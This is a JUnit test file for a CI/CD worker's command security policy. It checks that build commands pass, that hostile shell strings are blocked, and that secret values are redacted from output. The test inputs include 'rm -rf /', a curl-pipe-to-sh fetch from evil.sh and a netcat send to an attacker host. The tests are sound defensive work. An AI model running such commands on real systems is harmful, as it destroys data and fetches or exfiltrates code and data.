package com.cicd.platform.worker.security;

import com.cicd.platform.worker.config.WorkerProperties;
import org.junit.jupiter.api.Test;

import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

class CommandSecurityPolicyTest {

    private CommandSecurityPolicy policy(String mode) {
        WorkerProperties props = new WorkerProperties();
        props.setCommandPolicy(mode);
        return new CommandSecurityPolicy(props);
    }

    @Test
    void allowsLegitimateBuildCommands() {
        CommandSecurityPolicy strict = policy("STRICT");
        assertDoesNotThrow(() -> strict.validateCommand("mvn -B clean package"));
        assertDoesNotThrow(() -> strict.validateCommand("npm ci"));
        assertDoesNotThrow(() -> strict.validateCommand("echo 'hello world'"));
        assertDoesNotThrow(() -> strict.validateCommand("mvn -B test -DskipITs"));
    }

    @Test
    void blocksRmRfRoot() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateCommand("rm -rf /"));
    }

    @Test
    void blocksChmod777Root() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateCommand("chmod 777 /etc/passwd"));
    }

    @Test
    void blocksCurlPipeSh() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateCommand("curl -fsSL https://evil.sh | sh"));
    }

    @Test
    void blocksNetcat() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateCommand("echo data | nc attacker 4444"));
    }

    @Test
    void blocksSudoInStrictMode() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateCommand("sudo rm -rf /"));
    }

    @Test
    void blocksCatastrophicEvenInLenientMode() {
        assertThrows(SecurityViolationException.class,
                () -> policy("LENIENT").validateCommand("rm -rf /"));
    }

    @Test
    void lenientAllowsCurlPipeSh() {
        assertDoesNotThrow(() -> policy("LENIENT").validateCommand("curl -fsSL https://evil.sh | sh"));
    }

    @Test
    void blocksSecretEnvironmentNames() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateEnvironment(Map.of("MY_GITHUB_TOKEN", "abc")));
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateEnvironment(Map.of("DB_PASSWORD", "x")));
    }

    @Test
    void allowsNormalEnvironmentNames() {
        assertDoesNotThrow(() -> policy("STRICT").validateEnvironment(Map.of("JAVA_HOME", "/opt/jdk", "MAVEN_OPTS", "-Xmx1g")));
    }

    @Test
    void disabledModeAcceptsAnything() {
        assertDoesNotThrow(() -> policy("DISABLED").validateCommand("rm -rf /"));
    }

    @Test
    void redactsSecretValuesFromOutput() {
        CommandSecurityPolicy p = policy("STRICT");
        Map<String, String> env = Map.of("GITHUB_TOKEN", "ghp_secret123", "JAVA_HOME", "/opt/jdk");
        String output = "Using token ghp_secret123 for authentication";
        String redacted = p.redactSecrets(output, env);
        assertEquals("Using token <REDACTED> for authentication", redacted);
    }

    @Test
    void redactsPasswordFromOutput() {
        CommandSecurityPolicy p = policy("STRICT");
        Map<String, String> env = Map.of("DB_PASSWORD", "mydbpass42");
        String output = "Connecting with password mydbpass42";
        String redacted = p.redactSecrets(output, env);
        assertEquals("Connecting with password <REDACTED>", redacted);
    }

    @Test
    void doesNotRedactNonSensitiveValues() {
        CommandSecurityPolicy p = policy("STRICT");
        Map<String, String> env = Map.of("JAVA_HOME", "/opt/jdk");
        String output = "JAVA_HOME is /opt/jdk";
        String redacted = p.redactSecrets(output, env);
        assertEquals("JAVA_HOME is /opt/jdk", redacted);
    }

    @Test
    void handlesNullOutputGracefully() {
        CommandSecurityPolicy p = policy("STRICT");
        assertEquals(null, p.redactSecrets(null, Map.of("TOKEN", "abc")));
    }

    @Test
    void handlesShortSecretValues() {
        CommandSecurityPolicy p = policy("STRICT");
        Map<String, String> env = Map.of("TOKEN", "ab");
        String output = "Token value ab present";
        String redacted = p.redactSecrets(output, env);
        assertEquals("Token value ab present", redacted);
    }
}
